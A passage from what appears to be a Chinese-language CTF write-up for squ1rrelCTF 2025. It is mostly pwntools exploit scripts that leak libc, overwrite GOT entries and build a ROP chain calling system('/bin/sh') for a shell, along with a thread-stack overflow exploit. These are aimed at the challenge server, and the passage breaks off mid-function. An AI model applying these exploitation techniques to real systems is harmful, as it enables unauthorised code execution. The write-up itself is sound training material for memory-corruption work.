        <span class="n">tmp</span> <span class="o">=</span> <span class="nf">view_card</span><span class="p">(</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="mi">8</span><span class="o">-</span><span class="n">l</span><span class="p">)</span><span class="o">&lt;&lt;</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="n">h</span><span class="p">)</span> <span class="p">)</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">h</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
        <span class="n">libc_base</span> <span class="o">+=</span> <span class="n">tmp</span>

<span class="c1">#for l in range(0,8):
#    for h in range(2):
#        tmp = view_card( -((0xe8-0x60-l)&lt;&lt;1)+(1-h) )
#        tmp = (tmp &lt;&lt; (4*h)) &lt;&lt; (l*8)
#        elf_base += tmp
#
#elf_base -= 16480
</span><span class="nf">bk</span><span class="p">()</span>

<span class="n">libc_base</span>   <span class="o">-=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>

<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">gets</span><span class="sh">'</span><span class="p">]</span>

<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">target</span><span class="sh">'</span><span class="p">)</span>

<span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="mh">0x10</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">edit_4bit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="mh">0x41</span><span class="p">)</span>
<span class="nf">bk</span><span class="p">()</span>
<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">target</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="n">l</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">4</span><span class="o">*</span><span class="n">h</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xF</span>
        <span class="k">if</span> <span class="n">tmp</span><span class="p">:</span>
            <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">h</span><span class="p">)</span>
            <span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="p">((</span><span class="mh">0xe8</span><span class="o">-</span><span class="n">l</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">tmp</span><span class="p">))</span>
            <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
            <span class="nf">edit_4bit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">tmp</span><span class="p">)</span>
            <span class="nf">bk</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">pass</span>


<span class="c1">#gdb.attach(io,gdbscript=gdbscript)
</span><span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
<span class="n">rdi</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="nf">asm</span><span class="p">(</span><span class="sh">'</span><span class="s">pop rdi;ret</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>
<span class="nf">pause</span><span class="p">()</span>
<span class="n">pay</span>  <span class="o">=</span> <span class="mh">0x38</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406115702-gfuy7su.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406115702-gfuy7su.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<p>‍</p>

<h2 id="squ1rrel-logon附件更新"><span class="me-2">squ1rrel-logon（附件更新）</span><a href="#squ1rrel-logon附件更新" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>两个线程栈 之间 隔着 0x1000, 原本的附件会有检测，附件更新后就没了</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214131-4z5vzc4.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/image-20250406214131-4z5vzc4.png" alt="image" loading="lazy"></a></p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">20.84.72.194 5005</span><span class="sh">'</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./terminal</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="c1">#libc = context.binary.libc
#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b * 0x401481
b *0x04015E2
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>

<span class="c1">#gdb.attach(io,gdbscript=gdbscript)
</span><span class="n">s1</span> <span class="o">=</span> <span class="mh">0x8010e0</span><span class="o">-</span><span class="mh">0x17</span>

<span class="n">s2</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Length: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">s1</span><span class="p">))</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Length: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">s2</span><span class="p">))</span>

<span class="n">p1</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="c1"># flag
#p1 += p64(0x0401613)
</span>
<span class="n">p2</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">H</span><span class="se">\x00</span><span class="sh">'</span>

<span class="c1">#
#itr()
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">p1</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">p2</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">p1</span><span class="o">+</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>


<span class="nf">itr</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<h2 id="pwn-squ1rrel-casino-原版"><span class="me-2">pwn-squ1rrel-casino （原版）</span><a href="#pwn-squ1rrel-casino-原版" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>已经可以劫持执行流了，打远程发现附件换了？ 傻逼比赛</p>

<p>‍</p>

<p>可以泄露libc 和 elf 的地址</p>

<p>修改got 表 任意半个字节</p>

<p>‍</p>

<ul>
  <li>本地触发 （劫持got 表），（然后准备打远程测试，发现附件更新了）</li>
</ul>

<p>‍</p>

<p>然后 改个got 表就行了</p>

<p><a href="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/00b8ae032b62eb9c6ce63f2d2e462588-20250406213801-9m3o76k.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-squ1rrelCTF/assets/00b8ae032b62eb9c6ce63f2d2e462588-20250406213801-9m3o76k.png" alt="00b8ae032b62eb9c6ce63f2d2e462588" loading="lazy"></a></p>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="n">cdl</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">'</span><span class="s">/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">'</span><span class="p">)</span>
<span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">20.84.72.194 5004</span><span class="sh">'</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./casino</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="c1">#context(log_level = 'debug')
</span><span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="c1">#elf  = ELF(binary)
#print(context.binary.libs)
#libc = ELF('./libc.so.6')
#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x1104
brva 0x1040
#brva 0x0179A
#brva 0x01667
#brva 0x179A
#brva 0x01DC7
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
<span class="c1">#import os
#os.systimport os
#io = remote(*attack.split(':'))
</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>

<span class="n">name_list</span> <span class="o">=</span> <span class="p">[</span>
        <span class="nf">p64</span><span class="p">(</span><span class="mh">0x29312820656341</span><span class="p">)</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x293228206F7754</span><span class="p">)</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Three (3)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Four (4)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Five (5)</span><span class="sh">"</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x29362820786953</span><span class="p">)</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Seven (7)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Eight (8)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Nine (9)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Ten (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Jack (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Queen (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">King (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Joker (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">Special (10)</span><span class="sh">"</span>
        <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x6E776F6E6B6E55</span><span class="p">)</span>
        <span class="p">]</span>

<span class="k">def</span> <span class="nf">get_card_name</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">name_list</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">draw_card</span><span class="p">():</span>
    <span class="nf">return </span><span class="p">(</span><span class="n">cdl</span><span class="p">.</span><span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">15</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">play</span><span class="p">():</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">draw_card</span><span class="p">()</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">view</span><span class="p">():</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Choose an option: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s"> replace? </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">view_card</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
